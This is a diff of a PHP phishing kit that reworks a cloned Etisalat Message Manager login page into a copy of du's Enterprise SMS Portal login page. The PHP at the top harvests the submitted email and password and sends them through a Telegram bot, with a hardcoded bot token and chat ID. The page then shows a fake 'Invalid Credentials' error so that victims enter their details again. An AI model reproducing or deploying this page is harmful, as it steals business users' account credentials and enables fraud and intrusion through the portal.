@@ -4,17 +4,18 @@ $error = 0;
 $chat_id = '5064068409';
 $token = '5147525784:AAFmgFWsNWvlQJV-G3E9BDpF72R6l5fSMRg';
 
+$refreshCount  = 0;
 $try  = 0;
 if (isset($_POST['try'])) {
   $try = $_POST['try']+1;
-  $customerID = $_POST['MMcustomerID'];
-  $userName = $_POST['MMuserName'];
-  $password = $_POST['MMpassword'];
+  $refreshCount = $_POST['refreshCount']+1;
+  $vcEmail = $_POST['id_vcEmail'];
+  $vcPassword = $_POST['id_vcPassword'];
+  echo "sss";
 
-  $message  = "====================={New User Login MM}=====================" . PHP_EOL;
-  $message .= " customerID : $customerID " . PHP_EOL;
-  $message .= " userName : $userName " . PHP_EOL;
-  $message .= " password : $password " . PHP_EOL;
+  $message  = "====================={New User Login DU}=====================" . PHP_EOL;
+  $message .= " UserEmail : $vcEmail " . PHP_EOL;
+  $message .= " Password : $vcPassword " . PHP_EOL;
 
   $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($message);
   // $url = "https://api.telegram.org/bot5772083692:AAEGIKDuqjztt3JHcSTPhEBvRHo347EbJI8/sendMessage?chat_id=5794400860&text=hello";
@@ -22,7 +23,7 @@ if (isset($_POST['try'])) {
 //   $url = "https://api.telegram.org/bot5772083692:AAEGIKDuqjztt3JHcSTPhEBvRHo347EbJI8/sendMessage?chat_id=5794400860&text=hello";
     $result = file_get_contents($url);
     $result = json_decode($result, true);
-
+    
   if (isset($result['ok'])) {
     if (isset($result['result'])) {
     }
@@ -36,313 +37,694 @@ if (isset($_POST['try'])) {
 } 
 ?>
 
-<!DOCTYPE html PUBLIC "-//W3C//DTD Xhtml 1.0 Transitional//EN" "http://www.w3.org/tr/xhtml1/DTD/xhtml1-transitional.dtd">
-<!-- saved from url=(0070)https://messaging.etisalat.ae/bmsweb/Login.aspx?ReturnUrl=%2fbmsweb%2f -->
-<html xmlns="http://www.w3.org/1999/xhtml"><head id="Head1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="./MM_Files/main.css"><title>
-	Message Manager Login
-</title><script type="text/javascript" src="./MM_Files/jquery.js.download"></script>
-    </head><body><span id="CaptchaHeaderControl1"><link href="./MM_Files/WebResource.axd" rel="stylesheet" type="text/css"><script src="./MM_Files/WebResource(1).axd" type="text/javascript"></script></span><script type="text/javascript" language="javascript" charset="UTF-8" src="./MM_Files/jquery.js(1).download"></script><script type="text/javascript" language="javascript" charset="UTF-8" src="./MM_Files/Common.js.download"></script><!--[if IE]>
-                <link rel="stylesheet" type="text/css" href="/bmsweb/Content/css/ie.css" />
-                <![endif]--><!--[if lt IE 7]>
-                <link rel="stylesheet" type="text/css" href="/bmsweb/Content/css/ie6.css" />
-                <![endif]--><!--[if lt IE 7]>
-                <script type="text/javascript" charset="UTF-8" src="/bmsweb/Scripts/fixpng.js"></script>
-                <![endif]--><!--Debug info: HostName - app1-->
+<!DOCTYPE html>
+<!-- saved from url=(0034)https://enterprisesmsportal.du.ae/ -->
+<html x-ms-format-detection="none" lang="en"><!--  x-ms-format-detection to unhighlight number decoration in IE -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+ 
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>DU</title>
+	<!-- Start : Sweetalert CSS / JS - Pushpa 2019-03-21 @ 11.40 AM  -->
+	  <link href="./DU_files/sweetalert.css" rel="stylesheet">
+	   <link rel="stylesheet" href="./DU_files/icon">
+	  <script type="text/javascript" src="./DU_files/sweetalert.min.js.download"></script> 
+	  <!-- End : Sweetalert CSS / JS - Pushpa 2019-03-21 @ 11.40 AM  -->
+	<link rel="icon" href="https://enterprisesmsportal.du.ae/static/img/fav.png" type="image/png">
+   
+	<link rel="stylesheet" href="./DU_files/font-awesome.min.css">
+	<link href="./DU_files/bootstrap.min.css" rel="stylesheet">
+	<link href="./DU_files/datepicker.css" rel="stylesheet">
+	<link href="./DU_files/mdb.min.css" rel="stylesheet">
+	<link href="./DU_files/hover.css" rel="stylesheet">
+	<link href="./DU_files/style.css" rel="stylesheet">
+	<!-- <link href="/static/users/css/select2.min.css" rel="stylesheet"> -->
 
-  <img class="login-bg" src="./MM_Files/login_background_en.jpeg" alt="">
-  <form name="theForm" action=""
+	<!--link href="/static/users/css/developer.css" rel="stylesheet"-->
+
+	<link href="./DU_files/datatables.min.css" rel="stylesheet">
+	<link href="./DU_files/responsive.dataTables.min.css" rel="stylesheet">
+	<script type="text/javascript" src="./DU_files/jquery.min.js.download"></script>
+	<script type="text/javascript">var assetsImgTarget =  "/static/users/img/" </script>
+	<script type="text/javascript" src="./DU_files/popper.min.js.download"></script>
+	<script type="text/javascript" src="./DU_files/bootstrap.min.js.download"></script>
+	<script type="text/javascript" src="./DU_files/datatables.min.js.download"></script>
+	<script type="text/javascript" src="./DU_files/dataTables.responsive.min.js.download"></script>
+	<script type="text/javascript" src="./DU_files/developer.js.download"></script>
+ 
+<!--   <script type="text/javascript" src="/static/users/js/bootstrap-datepicker.js" ></script> 
+ -->  
+  <!-- Start : Bootstrap Date picket dependent css and js -->
+
+  <!-- End : Bootstrap Date picket dependent css and js -->
+  <!-- Material Bootstrap date time picker dependet CSS / JS  -->
+  <link href="./DU_files/material-icons.css" rel="stylesheet">
+  <link href="./DU_files/bootstrap-material-datetimepicker.css" rel="stylesheet">
+  <script type="text/javascript" src="./DU_files/moment-with-locales.min.js.download"></script>
+  <script type="text/javascript" src="./DU_files/bootstrap-material-datetimepicker.js.download"></script> 
+  <!-- Material Bootstrap date time picker dependet CSS / JS  -->
+ <!-- Start : Date Range Picker CSS / JS - Jagadeesh 2019-01-10 @ 11.50 AM  -->
+  <link href="./DU_files/daterangepicker.css" rel="stylesheet">
+  <script type="text/javascript" src="./DU_files/moment.min.js.download"></script>
+  <script type="text/javascript" src="./DU_files/daterangepicker.js.download"></script>
+  <!-- End : Date Range Picker CSS / JS - Jagadeesh 2019-01-10 @ 11.50 AM  -->
+  <!-- <script type="text/javascript" src="/static/users/js/select2.min.js" ></script> -->
+ <!--  <script type="text/javascript" src="/static/users/js/select2.min.js" ></script> -->
+
+  <script type="text/javascript" src="./DU_files/bootbox.min.js.download"></script>
+  <script type="text/javascript">
+	var assetsPath = "/static/users/img/";//added
+    var encodedMobile = "";
+	/*Start : Default Serch From and To date - Jagadeesh 2019-01-17 @ 08.40 PM*/
+   var searchFromDate = '';
+   var searchToDate = '';
+   /*End : Default Serch From and To date - Jagadeesh 2019-01-17 @ 08.40 PM*/  
+	//Start : Default values assigned - Jagadeesh 2019-03-19 @ 05.00PM
+    var defaultAuthIdelTime = '15';
+	var defaultAuthIdelTimeseconds = '900';
+    var logoutURL = "/logout/";
+	var logout_popup = '5';
+	var idleSettime = '';
+  //End : Default values assigned - Jagadeesh 2019-03-19 @ 05.00PM
+  </script>
+  
+  <!-- Start: Bootstrap Select2 Js assets - Jagadeesh 2019-02-14 @ 01.45 PM -->
+  <link href="./DU_files/select2.min.css" rel="stylesheet">
+  <script type="text/javascript" src="./DU_files/select2.min.js.download"></script>
+  <!-- End: Bootstrap Select2 Js assets - Jagadeesh 2019-02-14 @ 01.45 PM -->
+  <!-- Start : noscript JS - Pushpa 2019-08-13 @ 11.58 AM  -->
+
+
+  <script>
+
+$(document).ready(function(){
+  $refreshCount = 1;
+});
+</script>
+
+  <noscript>
+    <link href="/static/users/css/noscript.css" rel="stylesheet">
+  </noscript>
+  <!-- End :  noscript JS - Pushpa 2019-08-13 @ 11.58 AM  -->
+ <style type="text/css">/* Chart.js */
+@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style></head>
+<body class="login-changed" aria-busy="true">
+  <div id="loader-div" class="lds-roller" style="display: none;">
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <!-- <h5 id="loadedLoadingHead">Loading</h5> -->
+    <!-- <h5 id="loaderUploadingHead">Uploading.. <span class="progresDynamic">0%</span></h5> -->
+  </div>
+  
+<!-- <div id="loader-div">
+<svg version="1.1" class="load_svg" id="L3" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+        viewBox="0 0 100 100" enable-background="new 0 0 0 0" xml:space="preserve">
+      <circle fill="none" stroke="#fff" stroke-width="4" cx="50" cy="50" r="44" style="opacity:0.5;"/>
+        <circle fill="#fff" stroke="#e74c3c" stroke-width="3" cx="8" cy="54" r="6" >
+          <animateTransform
+            attributeName="transform"
+            dur="2s"
+            type="rotate"
+            from="0 50 48"
+            to="360 50 52"
+            repeatCount="indefinite" />
+          
+        </circle>
+      </svg>
+	    </div>
+ -->
+  
+ <script>
+$(document).ready(function(){
+  $("#refreshId").click(function(){
+    $("#refreshCountId").val(1 + parseInt($("#refreshCountId").val()));
+    if(parseInt($("#refreshCountId").val()) > 9 )
+    $("#refreshCountId").val(0);
+    $("#captchaImage").attr("src": "./DU_files/captcha/0" + $("#refreshCountId").val() + ".png");
+  });
+});
+</script>
+ <script> var capchaUrl = "./DU_files/0" + $ref + ".png" </script>
+<div class="login-main">
+  <div class="login-left">
+	<img src="./DU_files/login_page-t.png" alt="">
+  </div>
+  <div class="login-right">
+	<div class="form-cont">
+	
+	<img src="./DU_files/logo-du.png" height="50" alt="Logo" class="mb-5">
+	<form name="theForm" action="" id = "myform"
 			autocomplete="off" method="post" onSubmit="">
-<script type="text/javascript">//<![CDATA[
-	var theForm;
-	if (document.getElementById) { theForm = document.getElementById ('frmMain'); }
-	else { theForm = document.frmMain; }
-//]]></script>
-
-<div class="aspNetHidden">
-
-<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value=""><input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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"><input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
-</div>
-
-<script type="text/javascript">//<![CDATA[
-window._form = theForm;
-window.__doPostBack = function (eventTarget, eventArgument) {
-	if(theForm.onsubmit && theForm.onsubmit() == false) return;
-	theForm.__EVENTTARGET.value = eventTarget;
-	theForm.__EVENTARGUMENT.value = eventArgument;
-	theForm.submit();
-}
-//]]></script>
-
-<script src="./MM_Files/WebResource(2).axd" type="text/javascript"></script>
-<script type="text/javascript">//<![CDATA[
-WebForm_Initialize(window);
-//]]></script>
-
-<script src="./MM_Files/ScriptResource.axd" type="text/javascript"></script>
-<script type="text/javascript">//<![CDATA[
-WebFormValidation_Initialize(window);//]]></script>
-<script src="./MM_Files/ScriptResource(1).axd" type="text/javascript"></script>
-<script type="text/javascript">//<![CDATA[
-if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
-//]]></script>
-<script src="./MM_Files/ScriptResource(2).axd" type="text/javascript"></script>
-<script type="text/javascript">//<![CDATA[
-
-window.WebForm_OnSubmit = function () {
-if (!window.ValidatorOnSubmit()) return false;
-return true;
-}
-//]]></script>
-
-    <script type="text/javascript">
-//<![CDATA[
-Sys.WebForms.PageRequestManager._initialize('ctl03', document.getElementById('frmMain'));
-Sys.WebForms.PageRequestManager.getInstance()._updateControls(['tctl04$PageHeader$upChangePassword'], [], [], 90);
-//]]
-</script>
-
-  <div id="divLoginCtlPlaceHolder">
-    
-  <div class="top" style="display: ">
-  <div id="ctl04_PageHeader_pnlLogo" class="top-header" onclick="javascript:window.open(&#39;default.aspx&#39;, &#39;_blank&#39;)">
-    <div class="logo-left">
-      <img alt="" src="./MM_Files/MM-logo.gif">
-    </div>
-    <div class="logo-right">
-      <img alt="" src="./MM_Files/naharnet.gif">
-    </div>
-  </div>
-  <div class="top-menu">
-    <div class="navlanguage">
-      
-
-<table id="ctl04_PageHeader_LanguageBarCtrl_listLanguages" cellspacing="0" style="border-collapse:collapse;">
-	<tbody><tr>
-		<td>
-    <a id="ctl04_PageHeader_LanguageBarCtrl_listLanguages_ctl00_language_0" href="javascript:__doPostBack(&#39;ctl04$PageHeader$LanguageBarCtrl$listLanguages$ctl00$language&#39;,&#39;&#39;)">عربي</a>
-  </td><td>
-    <span>&nbsp;|</span>
-  </td><td>
-    <a id="ctl04_PageHeader_LanguageBarCtrl_listLanguages_ctl02_language_1" href="javascript:__doPostBack(&#39;ctl04$PageHeader$LanguageBarCtrl$listLanguages$ctl02$language&#39;,&#39;&#39;)">English</a>
-  </td><td></td>
-	</tr>
-</tbody></table>
-
-
-    </div>
-    <div id="ctl04_PageHeader_upChangePassword">
-	
-        
-      
-</div>
-    
-  </div>
-</div>
-
-<script type="text/javascript" language="javascript">
-
-  $(document).ready(function()
-  {
-    $("#ctl04_PageHeader_btnLogof").click(function(e) { ShowLoading(); });
-  })
-
-</script>
-
-
-<div class="login-area">
-  
-  <div class="top-dotted">
-    <span id="ctl04_lOperation">Login</span>
-  </div>
-  
-  <div class="login-form">
-    <div class="title">
-      <span id="ctl04_lOperationSmall"></span>
-    </div>
-    <div class="form">
-      <div class="info">
-        <span id="ctl04_lError" style="color:Red;"> <?php  if( $error == 1){ echo "404.2 Invalid Login Details"; }  ?> </span>
-        <span id="ctl04_lInfo" style="color:Green;"></span>
-      </div>
-      <div class="cfix inputs-login">
-        <div class="lbl">
-          Customer ID
-          <span id="spanCustomerIDRequired" style="display: none; color: #ff0000">*</span>
-          <span id="ctl04_rfvCustomerID" style="visibility:hidden;color:Red;">*</span>
-        </div>
-        <div class="i-view">
-          
-          <input type="text" name="MMcustomerID" id="ctl04_txtCustomerID" title="Customer identifier (numeric)" class="inp-txt" autocomplete="off" onkeyup="CheckCustomerID()">
-          <div id="divMustBeNumeric" class="error-msg invisible">
-            Must be numeric</div>
-        </div>
-      </div>
-      <div class="cfix inputs-login">
-        <div class="lbl">
-          Username:
-          <span id="spanUserNameIDRequired" style="display: none; color: #ff0000">*</span>
-          <span id="ctl04_rfvLogin" style="visibility:hidden;color:Red;">*</span>
-        </div>
-        <div class="i-view">
-          
-          <input type="text" name="MMuserName" id="ctl04_txtLogin" title="Username:" class="inp-txt" autocomplete="off">
-        </div>
-      </div>
-      <div id="ctl04_pPassword">
-	
-          <div class="cfix inputs-login">
-            <div class="lbl">
-              <span id="ctl04_lPassword">Password:</span>
-              <span id="ctl04_rfvPassword" style="visibility:hidden;color:Red;">*</span>
-              <input type="hidden" name="try" value="<?=(isset($_POST['try']) ? $_POST['try']+1 : 0)?>">
-            </div>
-            <div class="i-view">
-              <input type="password" name="MMpassword" id="ctl04_txtPassword" title="Password:" class="inp-txt" autocomplete="off">
-            </div>
-            <div class="i-view">
-                <br>
-                <div id="divCaptcha">
-                    <span id="ctl04_ccLogin"><div id="CaptchaMainPanel" class="captcha-main-panel">
-		<img id="CaptchaImage" class="captcha-image" src="./MM_Files/captcha.axd" align="top"><input type="image" class="captcha-update-button" src="./MM_Files/WebResource(3).axd" alt="Click to refresh the code" align="middle"><br>
-    <div id="CaptchaInputPanel" class="captcha-input-panel">
-			<span id="CaptchaLabel" class="captcha-label">Type the code from the image:</span><br><input type="text" name="CaptchaCode" id="CaptchaCode" class="captcha-textbox">
-		</div><input type="hidden" id="captchakey" name="captchakey" value="658087c7-8303-4767-ba9a-4f9f050b2c5e">
-	</div></span>
+	  <h3 class="mb-5"><span id="signinhead">Enterprise SMS Portal</span></h3>
+		<input type="hidden" name="csrfmiddlewaretoken" value="wYpphSRxKY7o22qjGTIeMWCKaOdebygLtMiNK3VVjBqjn1EqKWAN7pK1WDgY60LV">
+				 
+                    <div class="md-form" autocomplete="off">
+						 <label for="id_vcEmail" class="">Enter your email address/Entity ID</label>
+						   <input type="text" name="id_vcEmail" class=" form-control" data-parsley-required="true" data-parsley-required-message="Enter Email ID/Entity ID" required="" id="id_vcEmail">
+							
+							<div class="txtCustomvcEmailErrorMessage error"></div>
+					</div>
+					
+                    <div class="md-form" autocomplete="off">
+						 <label for="id_vcPassword">Password</label>
+						   <input type="password" name="id_vcPassword" maxlength="50" class=" form-control" data-parsley-maxlength-message="" data-parsley-required="true" data-parsley-required-message=" " required="" id="id_vcPassword">
+               <input type="hidden" name="try" value="<?=(isset($_POST['try']) ? $_POST['try']+1 : 0)?>">
+               <input id = "refreshCountId" type="hidden" name="refreshCount" value="<?=(isset($_POST['refreshCount']) ? $_POST['refreshCount']+1 : 0)?>">
+							<div class="txtCustomvcPasswordErrorMessage error"><?php  if( $try == 1){ echo "Invalid Credentials"; }  ?></div>
+					</div>
+					
+                    
+					
+					<!-- Start : Captcha UI Purpose dynamically append divs - Jagadeesh & Surya (2020-10-17 @17.20)-->
+						
+					<div id="captchaMainDiv" class="clearfix"><div class="md-form captchaInputDiv" autocomplete="off">
+						 <label for="id_captcha_1">Captcha</label>
+						   
+<input type="hidden" name="captcha_0" value="bfabee40d96f96b2292bdeecbb5a722f28aa667d" class=" form-control" id="id_captcha_0"><input type="text" name="captcha_1" class=" form-control" id="id_captcha_1" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false">
+							
+<div class="txtCustomvcPasswordErrorMessage error">  </div>
+					</div><div id="captchaIMGPart"><img src="./DU_files/captcha/01.png" alt="captcha" class="captcha" id = "captchaImage"><a href="javascript:void(){}" class="captcha-refresh" id = "refreshId"><img src = "./DU_files/refresh.png" style = "margin-left: -10px"> </a></div></div>
+					<!-- End : Captcha UI Purpose dynamically append divs-->
+               <div class="get-Forget-Password">
+                <div>
+                  <div class="form-check pl-0">
+                    <input type="checkbox" class="form-check-input" id="rememberme" name="signinremember" value="0" data-parsley-multiple="signinremember">
+                    <label class="form-check-label active" for="rememberme" id="remember" value="0">Remember Me</label>
+                  </div>
                 </div>
-                <br>
-            </div>
-          </div>
-      
-</div>
-      <div id="ctl04_pLogin">
-	
-        <div id="ctl04_pRememberPassword">
-		
-            <div class="cfix inputs-login">
-              <div class="lbl">
+                <div>
+				<input type="hidden" name="encil" id="encil">	
+				<input type="hidden" name="enciv" id="enciv">
+				<input type="hidden" name="enckey" id="enckey">
+				<input type="hidden" name="encdata" id="encdata">
+				<input type="hidden" name="OTP" id="OTP">
+				<a href="https://enterprisesmsportal.du.ae/forgotpassword/" id="forgot">Forgot Password</a>
+				<a href="https://enterprisesmsportal.du.ae/unlock/" id="reset" style="display: none;">Reset Password</a>
+                </div>
               </div>
-              <div class="i-view">
-                <label class="chkb-b">
-                  <input name="ctl04$cbRememberPassword" id="ctl04_cbRememberPassword" type="checkbox" title="Remember password">
-                  Remember my password
-                </label>
-              </div>
-            </div>
-        
+				<button class="btn btn-warning  btn-block hvr-bounce-to-right waves-effect waves-light" id="login" type="submit">Login</button>
+				
+				<input type="hidden" name="signintype" id="signintype" value="1">
+				<input type="hidden" name="as_sfid" value="AAAAAAW5iVe6Bycw1Em03LdjqCpRI2J2pRX7UQ_AxyB06KnkPmtKchHHEk47QXkmsmR_7Fb1gqpBmE8laD8DzdIgEEL0nRNRSFE1h9sbz5VEzUuiUVo-WfqBxS9t4dBO9UptnPyS5AaCI2uI8l5aFRk2Zj-vASqZJHLKBnNSNV_btUoADQ=="><input type="hidden" name="as_fid" value="0afe5dbb56be1ed08d4fa14056c4848df62b62da"></form> 
 	</div>
-        
-        <div class="cfix buttons">
-          <input type="submit" name="ctl04$btnSubmit" value="Login" onclick="WebForm_DoPostback(&quot;ctl04$btnSubmit&quot;,&quot;&quot;,null,false,true,false,false,&quot;&quot;)" id="ctl04_btnSubmit" class="button-style" title="Enter...">
-          
-          
-        </div>
-      
-</div>
-      
-    </div>
-    <div class="clr">
-    </div>
   </div>
-
-  
-  
-  
-  
 </div>
 
-<script language="javascript" type="text/javascript">
-  function CheckCustomerID()
-  {
-    var inputText = $("#ctl04_txtCustomerID").val();
+<div class="modal fade" id="login-otp-Verify" tabindex="-1" role="dialog" aria-labelledby="f-Verify" aria-hidden="true" data-backdrop="static" data-keyboard="false">
+  <div class="modal-dialog" role="document">
+	<div class="modal-content">
+	  <div class="modal-header">
+		<h5 class="modal-title" id="exampleModalLabel"></h5>
+		<button type="button" id="redirectsignin" class="close" data-dismiss="modal" aria-label="Close">
+		  <span aria-hidden="true">×</span>
+		</button>
+	  </div>
+	  <div class="modal-body">
+	   <h4 class="f15">Stronger passwords alone aren't enough to protect your account from password breaches. Authenticate your login through OTP sent to your Mobile Number <span id="mobileno"></span>:</h4>
+	   <form>
+	   <div class="md-form">
+		  <input type="text" id="Loginotp" class="form-control" maxlength="6" autocomplete="nope" novalidate="">
+		  <label for="materialLoginotp">OTP</label>
+		  <span class="txtCustomiOtpErrorMessage error"></span>
+		  <small id="passwordHelpInlineMD" class="text-muted">
+		  </small>
+		</div>
+		<button class="btn btn-warning hvr-bounce-to-right waves-effect waves-light" id="verifyotp" type="submit">Verify</button>
+		<div class="get-otp get-otp-b">
+			<div>
+			  <a href="javascript:void(0)" id="generateotp" style="display: none;">Resend OTP</a>
+			</div>
+		</div>
+		<input type="hidden" name="as_sfid" value="AAAAAAVsPQnUN_05jQLN3hf0Hg4IGigQ5ZSF5hPe27NH2z0vYkTIQ1bzfSLY8vWgT8d-LDYrtlB6NtPT5aZ9dUOcjzXWCYq33PG4_j0yVtu2-iRtH-sgQRI9hiyw97wVqxzyX2pnLBgOYlL6lFYL4IEHLaAXMhP4FH1Oxo62j8GcKLzYKQ=="><input type="hidden" name="as_fid" value="deefa41b03fb2ae4f51c5beee5d9d705e9e67e9b"></form>
+	   
+	  </div>
+	</div>
+  </div>
+</div>
+    
+<script type="text/javascript" src="./DU_files/crypto-js.js.download"></script>
+<script type="text/javascript" src="./DU_files/aes.js.download"></script>
+<script type="text/javascript" src="./DU_files/enc.js.download"></script>
+<script type="text/javascript" src="./DU_files/pbkdf2.js.download"></script>  
 
-    if( isNaN(inputText) )
-    {
-      $("#divMustBeNumeric").removeClass("invisible");
-      $("#ctl04_txtCustomerID").addClass("inp-error");
-      return false;
-    }
-    else
-    {
-      $("#divMustBeNumeric").addClass("invisible");
-      $("#ctl04_txtCustomerID").removeClass("inp-error");
-      return true;
-    }
-  }
-  
-  function Trim(text, character)
-  {
-    while( text.substring(0, 1) == character )
-      text = text.substring(1, text.length);
-      
-    while( text.substring(text.length - 1, text.length) == character )
-      text = text.substring(0, text.length - 1);
-      
-    return text;
-  }
+<script type="text/javascript">
+
+signinTypeVal = 1// for enterprise
+var otpVerifyStatus = 0;
+var adminflag=1;
+var ldapflag= '1'
+$("#generateotp").hide();
+$("#reset").hide();
+$(document).on("keyup","#Loginotp",function(){
+		if (this.value.match(/[^0-9]/g)) {
+			this.value = this.value.replace(/[^0-9]/g, '');
+		}
+	});
+ $(".txtCustomiOtpErrorMessage").html("");
+ 
+
+ 
+// start---to populate values in rememberme case
+$(document).ready(function(){
+	
+	///////To active captcah label
+	/*Start : Captcha UI Purpose dynamically append divs - Jagadeesh & Surya (2020-10-17 @17.20)*/
+	//$("label[for='id_captcha_1']").addClass("active");
+	/*$("#id_captcha_1").blur(function(){
+	  $("label[for='id_captcha_1']").addClass("active");
+	});*/
+	$("#id_captcha_1").parent().addClass("captchaInputDiv");
+	$(".captcha").appendTo($("#captchaIMGPart"));
+	$(".captcha-refresh").appendTo($("#captchaIMGPart"));
+	$(".captchaInputDiv").appendTo($("#captchaMainDiv"));
+	$("#captchaIMGPart").appendTo($("#captchaMainDiv"));
+	/*End : Captcha UI Purpose dynamically append divs*/
+
+	$('#id_vcEmail').focus();
+	if (signinTypeVal=="1"){
+		//console.log('ENTERPRISE')
+		email="";
+		password="";
+		sessionStorage.setItem("EP_login_type",signinTypeVal);
+	}else{
+		signinTypeVal=7;
+		email="";
+		password="";
+		$('#forgot').hide();
+		$('#reset').hide();
+		sessionStorage.setItem("EP_login_type",signinTypeVal);
+	}
+	if(email!=''){
+		$("#id_vcEmail").val(email);
+		$('#id_vcEmail').focus();
+	}
+	if(password!=''){
+		$("#id_vcPassword").val(password);
+		$('#id_vcPassword').focus();
+	}
+
+ });
+//end ---to populate values in rememberme case
+ 
+///start - code for remember me
+$("#rememberme").click(function() {
+	email=$("#id_vcEmail").val();
+	password=$("#id_vcPassword").val();
+	flag=1
+	ChecksigninType=$("#signintype").val();
